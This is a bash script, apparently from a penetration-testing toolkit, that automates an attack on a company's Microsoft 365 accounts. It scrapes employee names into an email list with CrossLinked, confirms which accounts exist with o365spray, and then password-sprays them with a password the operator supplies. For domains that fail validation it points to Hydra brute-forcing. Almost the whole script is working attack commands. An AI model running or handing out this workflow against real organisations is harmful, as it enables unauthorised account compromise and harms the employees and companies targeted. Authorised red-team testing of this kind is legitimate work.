
home=$(echo ~)
read -p "Please enter workspace name: " workspace
EmailFormat=$(cat $home/workspaces/$workspace/Var/emailformat.txt)
emaildomain=$(head -1 $home/workspaces/$workspace/Users/emails/EmailList.txt | grep -o "@.*" | sed 's/@//')
clear

read -p "Do you already have an email list? " -n 1 -r
echo
if [[ $REPLY =~ ^[Nn]$ ]];
then
	
echo "creating email list"
read -p "Please enter the full name of the company you would like to Enumerate: " CompName
python3 /opt/CrossLinked/crosslinked.py -f $EmailFormat  "'$CompName'" -o $home/workspaces/$workspace/Users/emails/EmailList.txt
echo "email list Complete"
head -10 $home/workspaces/$workspace/Users/emails/EmailList.txt
sleep 3
clear

fi

read -p "Would you like to Continue to Validation/spray(Active/Bruteforce): " -n 1 -r
echo    # (optional) move to a new line
if [[ ! $REPLY =~ ^[Yy]$ ]];
then
	    /opt/AutoRecon/scripts/AutoEnum.sh
	    exit
fi

echo "Validating Domain"

python3 /opt/o365spray/o365spray.py -d $emaildomain --validate

read -p "Is the domain valid? :" -n 1 -r 
echo 
if [[ $reply =~ ^[Nn]$ ]]
then
	echo "Will require the use of Hydra to target email login form"
	read -n 1 -r -s -p "Press any key to return to main Menu" key
	/opt/AutoRecon/scripts/AutoEnum.sh
	exit
fi

echo "Validating email list"

python3 /opt/o365spray/o365spray.py -d $emaildomain --enum -U $home/workspaces/$workspace/Users/emails/EmailList.txt --output $home/workspaces/$workspace/Users/emails

validaccountfile=$(ls $home/workspaces/$workspace/Users/emails | grep -E "enum_valid*")

echo "setting up password spray" 
read -p "Please enter a password to use: " password

python3 /opt/o365spray/o365spray.py -d $emaildomain --spray -U $home/workspaces/$workspace/Users/emails/enum/$validaccountfile -p $password --output $home/workspaces/$workspace/Users/emails/spray

echo "Password spray finished and saved to: $workspace/Users/emails/spray"
echo "returning to main menu" 
/opt/AutoRecon/AutoEnum.sh






